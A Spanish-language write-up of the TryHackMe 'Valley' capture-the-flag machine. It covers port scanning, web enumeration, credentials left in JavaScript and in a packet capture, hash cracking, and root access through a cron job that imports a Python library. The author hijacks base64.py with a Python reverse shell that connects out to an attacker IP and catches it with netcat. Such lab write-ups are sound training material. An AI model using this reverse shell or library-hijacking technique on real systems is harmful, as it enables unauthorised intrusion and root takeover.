
## Introducción

En este writeup documentamos la resolución completa de la máquina **“Valley”** alojada en la plataforma TryHackMe. El objetivo de esta máquina es simular un entorno realista donde se deben aplicar habilidades de reconocimiento, enumeración de servicios, análisis de aplicaciones web y explotación básica para obtener acceso inicial y escalar privilegios.


## Reconocimiento y Enumeración Inicial

Como punto de partida para la fase de reconocimiento, se realizó un escaneo completo de puertos TCP utilizando **Nmap**, con parámetros optimizados para acelerar el proceso sin comprometer la calidad de los resultados.
`
```bash
─(zikuta㉿zikuta)-[~/TheValley]
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.10.114.161  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 16:31 CDT
Nmap scan report for 10.10.114.161
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

**Explicación de parámetros utilizados:**

- `-sS`: Realiza un **SYN scan** o escaneo sigiloso. Este tipo de escaneo envía paquetes SYN (inicio de conexión TCP) y analiza la respuesta para determinar si el puerto está abierto. Es más rápido y menos detectable que una conexión completa (TCP connect).
- `-sV`: Permite realizar **detección de versiones** del servicio que corre en cada puerto abierto.
- `-sC`: Ejecuta los **scripts NSE (Nmap Scripting Engine)** por defecto, lo cual permite obtener información adicional como banners, metadatos y configuraciones inseguras comunes.
- `-Pn`: Indica a Nmap que **no realice un ping previo** al host antes de escanearlo. Esto es útil en entornos donde el ICMP está bloqueado por firewall.
- `-p-`: Escanea **todos los 65535 puertos TCP**, lo cual es esencial para no pasar por alto servicios que corren en puertos no convencionales.
- `--min-rate 5000`: Aumenta la velocidad mínima de envío de paquetes a 5000 paquetes por segundo, acelerando el escaneo sin sacrificar precisión.

**Resultados relevantes:**
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     vsftpd 3.0.3
```

Se identificaron tres servicios activos:

- **SSH** en el puerto `22/tcp`, con una versión de OpenSSH asociada a Ubuntu 20.04.
- **Servidor web HTTP** en el puerto `80/tcp`, utilizando Apache 2.4.41.
- **Servidor FTP** en un puerto no convencional, `37370/tcp`, ejecutando vsftpd 3.0.3.

Este escaneo reveló puntos de entrada potenciales tanto en servicios orientados a web como en servicios de acceso remoto o transferencia de archivos.


### Fingerprinting de la Aplicación Web con WhatWeb

Con el fin de identificar tecnologías web y obtener metadatos del sitio, se utilizó la herramienta `whatweb`:

```bash
(zikuta㉿zikuta)-[~/TheValley]
└─$ whatweb 10.10.114.161
http://10.10.114.161 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.114.161], Script
```

Estos datos confirmaron que el sitio corre sobre un stack clásico de **Apache + Ubuntu** y que no existen mecanismos avanzados de ofuscación del servidor. Esto facilita la aplicación de técnicas de enumeración posteriores.

### Enumeración de Recursos Web con Gobuster

Para descubrir directorios y archivos ocultos en el servidor web, se utilizó `gobuster` en modo **directory brute-force**, empleando una wordlist estándar de Seclists y múltiples extensiones comunes de archivos web.

```bash
(zikuta㉿zikuta)-[~/TheValley]
└─$ gobuster dir -u http://10.10.114.161     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.161
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,py,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1163]
/gallery              (Status: 301) [Size: 316] [--> http://10.10.114.161/gallery/]                                                     
/static               (Status: 301) [Size: 315] [--> http://10.10.114.161/static/]                                                      
/pricing              (Status: 301) [Size: 316] [--> http://10.10.114.161/pricing/] 
```

**Resultados destacados:**

```bash
/index.html           (Status: 200)
/gallery              (Status: 301)
/static               (Status: 301)
/pricing              (Status: 301)
```

La existencia del directorio `/static/` indicó una posible ubicación de recursos estáticos como imágenes, archivos JavaScript, u otros elementos utilizados por la aplicación. Este tipo de rutas suele contener información sensible, especialmente en entornos de desarrollo.

### Análisis del Directorio `/static/`

Dado el potencial del directorio `/static/`, se realizó una segunda ronda de enumeración focalizada exclusivamente en esta ruta:

```bash
──(zikuta㉿zikuta)-[~/TheValley]
└─$ gobuster dir -u http://10.10.114.161/static/     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.114.161/static/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/11                   (Status: 200) [Size: 627909]
/12                   (Status: 200) [Size: 2203486]
/3                    (Status: 200) [Size: 421858]
/5                    (Status: 200) [Size: 1426557]
/6                    (Status: 200) [Size: 2115495]
/9                    (Status: 200) [Size: 1190575]
/15                   (Status: 200) [Size: 3477315]
/18                   (Status: 200) [Size: 2036137]
/00                   (Status: 200) [Size: 127]
```

Resultados interesantes:

```bash
/00                   (Status: 200) [Size: 127]
/11, /12, /5, /6, /9, etc... (tamaño mayor a 1MB)
```

Entre todos los recursos enumerados, `/00` llamó la atención por su **tamaño significativamente menor**, sugiriendo que podría contener texto o metadatos relevantes, en contraposición a los demás archivos que probablemente sean imágenes o binarios de gran tamaño.


### Análisis del Recurso `/static/00`

Al acceder a `http://10.10.114.161/static/00`, se visualizó una serie de **notas de desarrollo** aparentemente dejadas por un desarrollador del proyecto. Entre las líneas se encontraba la referencia a un directorio interno:

<img width="547" height="237" alt="Image" src="https://github.com/user-attachments/assets/f958ed7c-dc16-4e02-9778-173b2ec838b6" />


dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts

Este tipo de anotaciones son típicas de entornos de staging o pruebas internas, y sugieren la presencia de rutas no destinadas al público general. A continuación, se intentó acceder directamente al directorio `/dev1243224123123`.

### Descubrimiento de Página de Login y Archivo JavaScript

La ruta `http://10.10.114.161/dev1243224123123` contenía un **formulario de autenticación**, lo cual indicaba un posible mecanismo de acceso restringido.

<img width="1918" height="749" alt="Image" src="https://github.com/user-attachments/assets/2bc33912-a40f-48cf-9dfb-6c65e634ac74" />


Al inspeccionar el sitio mediante las herramientas de desarrollador del navegador, se identificó un archivo JavaScript externo denominado `dev.js`. Su análisis reveló credenciales en texto plano codificadas en el propio script:

<img width="615" height="238" alt="Image" src="https://github.com/user-attachments/assets/2045eef6-a012-49eb-9e96-37397e981c2d" />

```js
if (username === "siemDev" && password === "california") {
    window.location.href = "/dev1243224123123/devNotes37370.txt";
}
```

Estas credenciales (`siemDev:california`) se utilizaron posteriormente en el servicio FTP abierto en el puerto 37370, lo cual representa un claro caso de **exposición de credenciales a través de archivos estáticos mal configurados**.

## Ftp 

Nos conectamos por ftp y vemos que tenemos 3 archivos tipo .pcapng de wireshark que podemos analizar

```bash
                                                                    
┌──(zikuta㉿zikuta)-[~]
└─$ ftp 10.10.254.48 37370 
Connected to 10.10.254.48.
220 (vsFTPd 3.0.3)
Name (10.10.254.48:zikuta): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45290|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp> get siemHTTP2.pcapng
local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
229 Entering Extended Passive Mode (|||45620|)
150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
100% |************************|  1926 KiB  582.56 KiB/s    00:00 ETA
226 Transfer complete.
1972448 bytes received in 00:03 (553.41 KiB/s)

```

## Análisis de Tráfico Capturado (PCAP)

Una vez autenticados en el servicio FTP con las credenciales previamente descubiertas (`siemDev:california`), se identificaron tres archivos de captura de tráfico en formato `.pcapng`, comúnmente utilizados por herramientas como **Wireshark** para análisis de red:

```bash
-rw-rw-r--    1 1000  1000     7272     siemFTP.pcapng
-rw-rw-r--    1 1000  1000  1978716     siemHTTP1.pcapng
-rw-rw-r--    1 1000  1000  1972448     siemHTTP2.pcapng
```

Estos archivos se transfirieron al sistema local utilizando modo binario en FTP para evitar corrupción durante la descarga:

```bash
ftp> get siemHTTP2.pcapng
```

### Análisis de Captura HTTP

Los archivos `siemFTP.pcapng` y `siemHTTP1.pcapng` no contenían información relevante, pero al inspeccionar `siemHTTP2.pcapng` mediante Wireshark, se encontró una **transmisión de credenciales en texto plano**, característica de formularios sin HTTPS ni métodos de autenticación segura.

>  **Hallazgo crítico:**  
> Credenciales interceptadas:
> 
> - **Usuario:** `valleyDev`
>    
> - **Contraseña:** `ph0t0s1234`
>    

Este hallazgo representa una vulnerabilidad típica en entornos sin cifrado, donde datos sensibles pueden ser capturados a través de ataques de tipo **sniffing de tráfico HTTP**.

<img width="1916" height="843" alt="Image" src="https://github.com/user-attachments/assets/1168c571-f8a9-4f99-9155-baff77cd8403" />


las credenciales encontradas son username:`valleyDev` password:`ph0t0s1234` estas serian las credenciales para entrar al panel de ssh, 

## Acceso SSH

Con las credenciales interceptadas, se intentó iniciar sesión en el servicio SSH (`OpenSSH 8.2p1`) descubierto previamente en el puerto 22:

```bash
ssh valleyDev@10.10.114.161
```

Al proporcionar la contraseña `ph0t0s1234`, se obtuvo acceso exitoso al sistema como el usuario **`valleyDev`**.

### Obtención de la flag de usuario

Como práctica estándar tras el acceso inicial, se buscó la flag de usuario, normalmente almacenada en la ruta:

```bash
cat user.txt
```


## Búsqueda de Vectores para Escalada de Privilegios

Se inició la fase de post-explotación con una serie de comandos para enumerar permisos, configuraciones inseguras y tareas automatizadas que podrían permitir escalada de privilegios.

### Comando `sudo -l`

Se intentó verificar si el usuario tenía privilegios sudo:

```bash
sudo -l
```

Sin embargo, este intento resultó en un mensaje de autenticación fallida, indicando la contraseña proporcionada es inválida para esa operación.

### Búsqueda de archivos con permisos SUID

El siguiente paso fue buscar archivos con el bit **SUID (Set User ID)** habilitado, los cuales pueden ser explotados si permiten ejecución con privilegios elevados:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Este comando busca archivos ejecutables que se ejecutan con los permisos del propietario (comúnmente `root`). Sin embargo, no se identificaron binarios inusuales o explotables en esta máquina bajo esta categoría.

### Inspección de tareas programadas (cronjobs)

Al revisar los cronjobs del sistema, se identificaron varias tareas recurrentes

```bash
valleyDev@valley:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root      test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```


Se descubrieron **tres tareas programadas** con distintas frecuencias (minuto, hora y día), y entre ellas, un archivo `.py` que era ejecutado como **root cada minuto**. A pesar de este descubrimiento, el archivo no era modificable por el usuario `valleyDev`, lo que descartó un vector de escalada por **cronjob mal configurado o editable**.

## Descubrimiento de Binario Sospechoso en `/home`

Durante la exploración manual del sistema de archivos, se localizó un archivo ejecutable con un nombre sugestivo ubicado en el directorio `/home`:


```bash
valleyDev@valley:/home$ ls -l
total 744
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
```
Este binario se encontraba fuera de los lugares tradicionales de ejecución y su nombre sugiere una posible función relacionada con autenticación o control de acceso.

Dado que no se pudo escalar privilegios mediante `sudo` ni `cron`, este ejecutable se convirtió en el principal candidato para un análisis más profundo de comportamiento y posibles vulnerabilidades de ejecución.

### Exfiltración del binario para análisis local

Dado que no se contaba con permisos elevados ni acceso de escritura sobre archivos relevantes (como scripts en `/etc/cron.*`), se desplegó un servidor HTTP local usando Python para extraer el binario a través de la red

```bash
valleyDev@valley:/home$ ls -l
total 744
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
valleyDev@valley:/home$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.23.120.245 - - [30/Jul/2025 15:37:52] "GET /valleyAuthenticator HTTP/1.1" 200 -
^C
```

```bash
(zikuta㉿zikuta)-[~]
└─$ wget 'http://10.10.232.173:8080/valleyAuthenticator'
--2025-07-30 17:37:52--  http://10.10.232.173:8080/valleyAuthenticator
Connecting to 10.10.232.173:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 749128 (732K) [application/octet-stream]
Saving to: ‘valleyAuthenticator’

valleyAuthenticat 100%[==========>] 731.57K   733KB/s    in 1.0s    

2025-07-30 17:37:54 (733 KB/s) - ‘valleyAuthenticator’ saved [749128/749128]

                    
```



despues de descargarlo en nuestra maquina local decidimos ejecutar el comando `strings valleyAuthenticator | less`  y lo primero que nos aparecio fue `UPX!` eso significa que el binario está **comprimido con UPX (Ultimate Packer for eXecutables)**.

```bash
(zikuta㉿zikuta)-[~]
└─$ strings valleyAuthenticator | less
```

<img width="642" height="566" alt="Image" src="https://github.com/user-attachments/assets/4bd56405-8aeb-47b1-8f66-7fcfd81bd4bf" />


despues de desempaquetar el archivo UPX cone el comando `upx -d` procederemos a revisar las strings de el ejecutable con el comando `strings valleyAuthenticator`  y mientras revisamos nos encontraremos con 2 posibles hashes 

	e6722920bab2326f8217e4bf6b1b58ac
	dd2921cc76ee3abfd2beb60709056cfb

Ahora con los hashes utilizaremos una herramienta llamada hash-identifier para identificar el tipo de hash que nos acabamos de encontrar y posteriormente poder crackearlo con el formato correcto.

este hash nos da varias posibilidades 

```bash
--------------------------------------------------
 HASH: e6722920bab2326f8217e4bf6b1b58ac

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

y este otro 

```bash
HASH: dd2921cc76ee3abfd2beb60709056cfb

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

teniendo en cuenta que la opcion mas sugerida es encriptacion MD5 utilizaremos ese formato para crackear los hashes.

al crackear los dos hashes nos encontramos con el usuario `valley` y la contrasena `liberty123`

```bash
─(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ echo "e6722920bab2326f8217e4bf6b1b58ac" > hash.txt 
                                                                     
┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
liberty123       (?)     
1g 0:00:00:00 DONE (2025-07-30 20:38) 33.33g/s 7257Kp/s 7257Kc/s 7257KC/s lovein1..liberty12
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
                                                                     
┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ rm hash.txt
                                                                     
┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ echo "dd2921cc76ee3abfd2beb60709056cfb" > hash.txt
                                                                     
┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
valley           (?)     
1g 0:00:00:00 DONE (2025-07-30 20:39) 50.00g/s 345600p/s 345600c/s 345600C/s oblivion..better
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

asi que intentamos iniciar sesion por ssh con ese usuario y contrasena y PUM contrasena exitosa

Como usuario  `valley`, procedimos a modificar el script `photosEncrypt.py`, pero descubrimos que solo el usuario `root` tiene permisos de escritura sobre él. 

Al analizar el código, notamos que importa la librería `base64`, por lo que decidimos verificar si teníamos permisos para modificar dicha librería.

Efectivamente, pudimos editar el archivo `base64.py` y agregamos una reverse shell con el siguiente código:

```bash
import socket,os,pty

def reverse_shell():
    s=socket.socket()
    s.connect(("10.23.120.245", 4444)) 
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")

reverse_shell()
```

Considerando que existen tareas programadas en `crontab` que se ejecutan periódicamente (cada minuto, hora y día), esperamos a que `root` ejecute alguna de estas tareas y active nuestra reverse shell. Después de aproximadamente un minuto, obtuvimos acceso como root:

```bash
(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.23.120.245] from (UNKNOWN) [10.10.8.109] 37576
root@valley:~# cat root.txt
cat root.txt
hola

```

### Conclusión de la Máquina _Valley_

La máquina **Valley** representa un entorno vulnerable que combina múltiples vectores de ataque, desde fallas en la exposición de información hasta la explotación de credenciales en texto plano y el análisis de binarios.  

Durante la resolución, se aplicaron técnicas de **reconocimiento activo** (escaneo de puertos y fingerprinting de servicios), **enumeración de directorios web**, **análisis de tráfico de red (PCAP)** y **extracción de credenciales** para obtener acceso inicial mediante SSH.  

Posteriormente, la **ingeniería inversa ligera de un binario comprimido con UPX** permitió descubrir hashes que, una vez crackeados, proporcionaron acceso a un usuario con mayores privilegios. Finalmente, se aprovechó una **tarea programada que ejecutaba una librería de Python vulnerable a modificaciones**, obteniendo así acceso como root y la flag final.

Este escenario resalta la importancia de implementar prácticas seguras de desarrollo, como el uso de HTTPS, evitar credenciales en código fuente, restringir permisos en binarios y librerías, y proteger las tareas programadas contra modificaciones maliciosas.

# Tecnicas utilizadas

|**Fase**|**Técnica**|**Descripción**|
|---|---|---|
|Reconocimiento|`nmap -sS -sV -sC -Pn -p-`|Escaneo completo de puertos TCP, detección de versiones y ejecución de scripts NSE.|
|Fingerprinting Web|WhatWeb|Identificación de tecnologías del servidor web (Apache 2.4.41 en Ubuntu).|
|Enumeración Web|Gobuster|Descubrimiento de directorios y archivos ocultos en la aplicación web.|
|Exposición de Credenciales|Análisis de dev.js|Obtención de credenciales en texto plano embebidas en un archivo JavaScript.|
|Análisis de Tráfico|Wireshark (PCAP)|Extracción de credenciales transmitidas sin cifrado a partir de capturas de tráfico.|
|Acceso Inicial|SSH|Autenticación como usuario valleyDev con credenciales interceptadas.|
|Ingeniería Inversa|UPX + strings + hash-identifier + John The Ripper|Desempaquetado de binario y crackeo de hashes MD5 para obtener credenciales adicionales.|
|Escalada de Privilegios|Modificación de librería Python|Inserción de reverse shell en base64.py para ejecutar código como root vía cronjob.|

